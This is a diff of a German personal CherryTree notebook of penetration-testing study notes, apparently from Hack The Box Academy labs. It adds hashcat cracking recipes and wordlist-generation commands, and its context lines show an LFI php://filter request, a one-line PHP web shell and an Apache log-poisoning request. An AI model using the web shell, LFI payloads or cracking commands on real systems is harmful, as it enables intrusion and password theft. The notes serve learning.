@@ -2,7 +2,7 @@
 <cherrytree>
   <bookmarks list=""/>
   <node unique_id="1" master_id="0" name="Vorlage" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1601580584" ts_lastsave="1605821339">
-    <node unique_id="136" master_id="0" name="New" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="1" foreground="" ts_creation="1725739981" ts_lastsave="1725740002">
+    <node unique_id="136" master_id="0" name="New" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="1" foreground="" ts_creation="1725739981" ts_lastsave="1728412913">
       <rich_text>
 
 
@@ -546,7 +546,9 @@ Ansatz finden wo eine Datei eingebunden ist
 dann mit 
 curl 94.237.54.201:55266/index.php?page=php://filter/read=convert.base64-encode/resource=index
 Die antwort auslesen
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 Dann mit 
 echp “BASE64INHALT” | base64 -d anzeigne lassen und spuren suchen
@@ -674,7 +676,9 @@ Apache Logfile für Poisining
 </rich_text>
         <rich_text family="monospace">&lt;?php system($_GET['cmd']); ?&gt;</rich_text>
         <rich_text>
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 
 GET /index.php?language=/var/log/apache2/access.log&amp;cmd=ls%20/ HTTP/1.1
@@ -730,10 +734,109 @@ aws s3 cs --endpoint-url=</rich_text>
         <rich_text>
 </rich_text>
       </node>
-      <node unique_id="147" master_id="0" name="find" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1727813630" ts_lastsave="1728238017">
+      <node unique_id="147" master_id="0" name="find" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1727813630" ts_lastsave="1728327581">
         <rich_text> What is the name of the config file that has been created after 2020-03-03 and is smaller than 28k but larger than 25k?
  
  find / -name *.conf -newermt 2020-03-03 -size +25k -size -28k 2&gt;/dev/null</rich_text>
+      </node>
+      <node unique_id="149" master_id="0" name="encryption" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728327581" ts_lastsave="1728412946">
+        <rich_text>MD5
+echo -n “p@ssw0rd” | md5sum
+
+
+XOR
+Create the XOR ciphertext of the password ‘opens3same’ using the key ‘academy’. 
+</rich_text>
+      </node>
+      <node unique_id="151" master_id="0" name="Hashcat" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728412946" ts_lastsave="1728419447">
+        <rich_text>Hash Identifizieren
+
+
+hash-identifier 0c352d5b2f45217c57bef9f8452ce376 
+
+
+hashcat  -m 0 -a 0  hash.txt   /usr/share/wordlists/rockyou.txt -O  #-O für Optimierung
+
+</rich_text>
+        <rich_text link="webs https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text scale="h2">Dictionary Attack</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text family="monospace">hashcat -a 0 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist&gt; -O</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text scale="h1">Combination Attack</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text family="monospace">hashcat -a 1 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist1&gt; &lt;wordlist2&gt; -O</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text scale="h1">Mask Attack</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text family="monospace">hashcat -a 3 -m 0 md5_mask_example_hash -1 01 ‘ILFREIGHT?l?l?l?l?l20?1?d’ -O</rich_text>
+        <rich_text>
+
+Beispiel
+</rich_text>
+        <rich_text family="monospace">hashcat -a 3 -m 0 50a742905949102c961929823a2e8ca0 </rich_text>
+        <rich_text>-1 02 'HASHCAT?l?l?l?l?l20?1?d' -=
+
+
+</rich_text>
+        <rich_text scale="h1">Hybrid Mode</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h4">Hashcat - Hybrid Attack using Wordlists with Masks</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text family="monospace">hashcat -a 7 -m 0 hybrid_hash_prefix -1 01 '20?1?d' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</rich_text>
+        <rich_text>
+
+hashcat -a 6 -m 100 978078e7845f2fb2e20399d9e80475bc1c275e06  /usr/share/wordlists/rockyou.txt -O '?d?s'
+
+
+</rich_text>
+        <rich_text scale="h1">Working with Rules</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text link="webs https://academy.hackthebox.com/module/20/section/218">https://academy.hackthebox.com/module/20/section/218</rich_text>
+        <rich_text>
+
+ hashcat -a 0 -m 100 hash.txt /usr/share/wordlists/rockyou.txt -r rule.txt -O
+
+cat rule.txt                                                                 
+c so0 si1 se3 ss5 sa@ $2 $0 $2 $0
+
+
+
+
+</rich_text>
+      </node>
+      <node unique_id="152" master_id="0" name="Crunch Cupp CeWL" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728417177" ts_lastsave="1728417461">
+        <rich_text>-d Wiederholungen
+
+</rich_text>
+        <rich_text family="monospace">crunch 12 12 -t 10031998@@@@ -d 1 -o wordlist</rich_text>
+        <rich_text>
+
+
+cupp -i starten
+</rich_text>
+        <rich_text family="monospace">cewl -d &lt;depth to spider&gt; -m &lt;minimum word length&gt; -w &lt;output wordlist&gt; &lt;url of website&gt;</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text family="monospace">cewl -d 5 -m 8 -e http://inlanefreight.com/blog -w wordlist.txt</rich_text>
       </node>
     </node>
     <node unique_id="2" master_id="0" name="ALT" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="1" foreground="" ts_creation="1601580592" ts_lastsave="1725739999">
@@ -1582,9 +1685,6 @@ python3 -m http.server
  
  </rich_text>
       </node>
-      <node unique_id="49" master_id="0" name="Hashcat" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1604694378" ts_lastsave="1604694403">
-        <rich_text>hashcat -a 0 -m 1400 hash     wordlist</rich_text>
-      </node>
       <node unique_id="50" master_id="0" name="stego" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1604699594" ts_lastsave="1617998746">
         <rich_text>steghide extract -sf header.jpg 
 
@@ -1905,9 +2005,6 @@ sudo reaver -i wlan0mon -b 60:E3:27:BD:8B:DC -d 40 -S -N -vv -c Kanalnummer
         </node>
         <node unique_id="91" master_id="0" name="crackstation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652905214" ts_lastsave="1653941939">
           <rich_text link="webs https://crackstation.net/">https://crackstation.net/</rich_text>
-        </node>
-        <node unique_id="80" master_id="0" name="hashcat codes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652128666" ts_lastsave="1652128712">
-          <rich_text link="webs https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</rich_text>
         </node>
         <node unique_id="81" master_id="0" name="GTFO" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652128690" ts_lastsave="1652128692">
           <rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
